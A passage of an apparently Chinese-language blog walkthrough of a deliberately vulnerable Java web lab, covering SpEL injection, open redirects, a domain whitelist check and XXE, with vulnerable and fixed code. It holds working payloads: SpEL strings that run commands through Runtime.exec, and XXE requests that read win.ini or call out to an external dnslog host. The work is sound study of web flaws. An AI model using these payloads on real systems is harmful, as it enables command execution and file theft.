expression.getValue(context);    <span class="hljs-comment">// trigger vulnerability point</span><br>    <span class="hljs-keyword">return</span> x.toString();   <span class="hljs-comment">// response</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>-&gt; http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span>/spel/vuln1?value=<span class="hljs-built_in">T</span>(java.lang.Runtime).<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(%<span class="hljs-number">27</span>calc%<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942808.png" alt="20250726134132360"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=$&#123;T(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br>-&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8081</span>/spel/vuln2?value=<span class="hljs-variable">%2</span>4<span class="hljs-variable">%7BT</span>(java.lang.Runtime.getRuntime().exec(<span class="hljs-variable">%2</span>7calc<span class="hljs-variable">%27</span>)<span class="hljs-variable">%7D</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080942479.png" alt="20250726133936240"></p><h2 id="URLRedirect"><a href="#URLRedirect" class="headerlink" title="URLRedirect"></a>URLRedirect</h2><p>url重定向漏洞主要用来钓鱼，重定向跳转代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//直接拼接 url </span><br><span class="hljs-meta">@GetMapping(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url;<br>&#125;<br><br><span class="hljs-comment">//设置任意重定向头，手动设置 Location 响应头</span><br><span class="hljs-meta">@RequestMapping(&quot;/setHeader&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="hljs-comment">// 301 redirect</span><br>        response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url);<br>    &#125;<br><br><span class="hljs-comment">//用户控制跳转目标。自动设置状态码为 302 并写入 Location 头</span><br><span class="hljs-meta">@RequestMapping(&quot;/sendRedirect&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        response.sendRedirect(url); <span class="hljs-comment">// 302 redirect</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">//u</span>rlRedirect<span class="hljs-regexp">/redirect?url=http:/</span>/www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943493.png" alt="20250726134558956"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943956.png" alt="20250726134611955"></p><h2 id="URLWhiteList"><a href="#URLWhiteList" class="headerlink" title="URLWhiteList"></a>URLWhiteList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/url_bypass&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">url_bypass</span><span class="hljs-params">(String url, HttpServletResponse res)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    logger.info(<span class="hljs-string">&quot;url:  &quot;</span> + url);<br><br>    <span class="hljs-comment">//检查 url 是否是以 http:// 或 https:// 开头</span><br>    <span class="hljs-keyword">if</span> (!SecurityUtil.isHttp(url)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>    <span class="hljs-comment">//从 URL 对象中获取域名部分</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    logger.info(<span class="hljs-string">&quot;host:  &quot;</span> + host);<br><br>    <span class="hljs-comment">//遍历配置的域名白名单 domainwhitelist</span><br>    <span class="hljs-comment">// endsWith .</span><br>    <span class="hljs-keyword">for</span> (String domain : domainwhitelist) &#123;<br>        <span class="hljs-keyword">if</span> (host.endsWith(<span class="hljs-string">&quot;.&quot;</span> + domain)) &#123;<br>            res.sendRedirect(url);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br></code></pre></td></tr></table></figure><ul><li>创建一个 Java 标准库的 <code>URL</code> 对象，用于解析 <code>url</code> 字符串的结构。</li><li>比如：<br> <code>url = &quot;https://www.example.com:8080/path?q=1&quot;</code><br> 则：<ul><li><code>u.getHost()</code> &#x3D; <code>&quot;www.example.com&quot;</code></li><li><code>u.getPort()</code> &#x3D; <code>8080</code></li><li><code>u.getPath()</code> &#x3D; <code>&quot;/path&quot;</code></li></ul></li></ul><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><blockquote><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><h3 id="1-xmlReader-vuln"><a href="#1-xmlReader-vuln" class="headerlink" title="1.&#x2F;xmlReader&#x2F;vuln"></a>1.&#x2F;xmlReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/xmlReader/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有禁用 <code>DOCTYPE</code> 与实体相关的 SAX 特性</p><blockquote><p>SAX（Simple API for XML）解析器是一种基于事件驱动的解析方式，用于处理XML文档。与DOM解析器不同，SAX不需要将整个文档加载到内存中，因此对于大型文件尤其有用。</p></blockquote><p>POC:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/xmlReader/vuln HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包 <code>http://127.0.0.1:8081/xxe/xmlReader/vuln</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080943742.png" alt="20250727115850184"></p><p>修改为 POST 提交</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>已经触发了 XML 解析逻辑，但是没有读取文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944650.png" alt="20250727120554070"></p><p>换一种：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/xmlReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>198<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>说明服务端 确实解析并触发了外部实体加载，访问了构造的恶意 URL</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944167.png" alt="20250727121029322"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944742.png" alt="20250727121019973"></p><h3 id="2-xmlReader-sec"><a href="#2-xmlReader-sec" class="headerlink" title="2.&#x2F;xmlReader&#x2F;sec"></a>2.&#x2F;xmlReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">xmlReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">XMLReader</span> <span class="hljs-variable">xmlReader</span> <span class="hljs-operator">=</span> XMLReaderFactory.createXMLReader();<br>        <span class="hljs-comment">// fix code start</span><br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//fix code end</span><br>        xmlReader.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// parse xml</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xmlReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改后的方法禁用 <code>DOCTYPE</code> 声明，禁用外部实体（GENERAL + PARAMETER）</p><h3 id="3-SAXBuilder-vuln"><a href="#3-SAXBuilder-vuln" class="headerlink" title="3.&#x2F;SAXBuilder&#x2F;vuln"></a>3.&#x2F;SAXBuilder&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXBuilderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-comment">//创建一个 JDOM2 的 SAXBuilder 实例，它用于将 XML 字符串解析成一个 JDOM Document 对象</span><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));  <span class="hljs-comment">// cause xxe</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SAXBuilder</code> 默认开启了对 <strong>外部实体</strong> 的支持</p><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXBuilder/vuln</span>  <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> 127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span 